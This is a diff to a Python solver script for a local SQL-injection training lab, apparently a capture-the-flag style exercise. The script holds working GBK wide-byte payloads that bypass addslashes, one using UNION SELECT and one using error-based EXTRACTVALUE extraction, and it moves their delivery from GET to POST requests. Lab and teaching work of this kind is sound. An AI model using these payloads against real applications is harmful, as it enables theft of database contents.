@@ -10,32 +10,31 @@ The trick: send 0xBF before a single quote (0x27).
   - The quote 0x27 is now UNESCAPED and breaks out of the string
 
 Usage:
-    python3 lab20_gbk_widebyte.py [TARGET_URL]
+    python3 lab20_gbk_widebyte.py [BASE_URL]
 
-Default target: http://localhost/SQLi-Arena/public/lab.php
+Default target: http://localhost/SQLi-Arena
 """
 import requests
 import sys
 import re
-import urllib.parse
 
-TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/SQLi-Arena/public/lab.php"
+BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost/SQLi-Arena"
+TARGET = f"{BASE}/mysql/lab20"
 
 
 def method1_url_encode():
-    """Send the wide-byte payload via manually constructed URL."""
+    """Send the wide-byte payload via POST with URL-encoded body."""
     print("[*] Method 1: URL-encoded wide-byte payload")
 
     # %bf%27 = 0xBF + single quote
     # After addslashes: 0xBF 0x5C 0x27 → GBK char + unescaped quote
-    payload_encoded = "%bf%27+UNION+SELECT+secret,2+FROM+secret_data+--+-"
-    url = f"{TARGET}?lab=mysql/lab20&mode=black&username={payload_encoded}"
+    body = "username=%bf%27+UNION+SELECT+secret,2+FROM+secret_data+--+-"
 
-    print(f"[*] URL: {url}")
+    print(f"[*] POST body: {body}")
     print(f"[*] Bytes: 0xBF 0x27 → addslashes → 0xBF 0x5C 0x27 → GBK: [縗] + '")
     print()
 
-    r = requests.get(url)
+    r = requests.post(TARGET, data=body, headers={"Content-Type": "application/x-www-form-urlencoded"})
     match = re.search(r"FLAG\{[^}]+\}", r.text)
     if match:
         return match.group(0)
@@ -51,16 +50,10 @@ def method2_raw_bytes():
     # Decode as latin-1 to preserve raw bytes (requests will URL-encode them)
     payload_str = raw_payload.decode("latin-1")
 
-    params = {
-        "lab": "mysql/lab20",
-        "mode": "black",
-        "username": payload_str,
-    }
-
     print(f"[*] Raw bytes: {raw_payload}")
     print()
 
-    r = requests.get(TARGET, params=params)
+    r = requests.post(TARGET, data={"username": payload_str})
     match = re.search(r"FLAG\{[^}]+\}", r.text)
     if match:
         return match.group(0)
@@ -71,15 +64,16 @@ def method3_error_based():
     """Alternative: use error-based extraction with wide byte."""
     print("[*] Method 3: Error-based EXTRACTVALUE with wide byte")
 
-    payload_encoded = (
-        "%bf%27+AND+EXTRACTVALUE(1,+CONCAT(0x7e,+"
+    body = (
+        "username=%bf%27+AND+EXTRACTVALUE(1,+CONCAT(0x7e,+"
         "(SELECT+secret+FROM+secret_data+LIMIT+1)"
         "))+AND+%bf%27=%bf%27"
     )
-    url = f"{TARGET}?lab=mysql/lab20&mode=black&username={payload_encoded}"
 
-    r = requests.get(url)
-    match = re.search(r"XPATH syntax error: '~([^']+)'", r.text)
+    r = requests.post(TARGET, data=body, headers={"Content-Type": "application/x-www-form-urlencoded"})
+    import html as html_mod
+    text = html_mod.unescape(r.text)
+    match = re.search(r"XPATH syntax error: '~([^']+)'", text)
     if match:
         return match.group(1)
     return None
